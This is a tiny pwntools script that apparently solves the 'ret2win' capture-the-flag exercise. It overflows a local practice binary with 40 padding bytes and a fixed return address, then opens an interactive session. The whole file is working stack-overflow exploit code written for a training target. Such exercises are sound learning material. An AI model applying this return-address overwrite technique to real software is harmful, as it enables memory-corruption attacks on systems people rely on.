from pwn import *
p=process("./ret2win")
p.readuntil("> ")
payload="A"*40+p64(0x000000000400811)
p.send(payload)
p.interactive()
